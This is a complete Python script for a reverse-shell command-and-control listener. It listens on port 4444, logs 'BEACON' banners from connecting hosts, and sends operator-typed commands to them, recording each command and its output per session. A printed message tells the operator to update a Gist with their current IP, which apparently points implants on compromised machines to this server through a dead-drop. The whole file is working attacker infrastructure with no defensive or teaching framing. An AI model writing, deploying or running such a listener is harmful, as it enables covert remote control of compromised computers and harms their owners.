import socket
import threading
from datetime import datetime
from pathlib import Path

HOST = "0.0.0.0"
PORT = 4444
LOG_DIR = Path("logs")
LOG_DIR.mkdir(exist_ok=True)

def log(sid, data):
    with open(LOG_DIR / f"session_{sid}.txt", "a", errors="ignore") as f:
        f.write(f"[{datetime.now().isoformat()}] {data}\n")

def handle(conn, addr):
    print(f"\n[+] Connection from {addr[0]}:{addr[1]}")
    
    try:
        banner = conn.recv(4096).decode(errors="ignore")
        print(f"    {banner.strip()}")
        log(0, f"BEACON: {banner.strip()}")
    except:
        pass

    while True:
        try:
            cmd = input("").strip()
            if cmd == "back":
                break
            if not cmd:
                continue

            conn.send((cmd + "\r\n").encode())
            log(0, f"SEND: {cmd}")

            data = conn.recv(8192)
            if not data:
                break
            text = data.decode(errors="ignore")
            print(text, end="", flush=True)
            log(0, f"RECV: {text}")

        except (KeyboardInterrupt, EOFError):
            break
        except Exception as e:
            print(f"[!] {e}")
            break

    conn.close()
    print("[!] Connection closed")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((HOST, PORT))
s.listen(5)

print(f"[*] Listening on {HOST}:{PORT}")
print(f"[*] Update your Gist with your current IP before expecting connections")
print(f"[*] Press Ctrl+C to stop")

while True:
    try:
        conn, addr = s.accept()
        threading.Thread(target=handle, args=(conn, addr), daemon=True).start()
    except KeyboardInterrupt:
        break

s.close()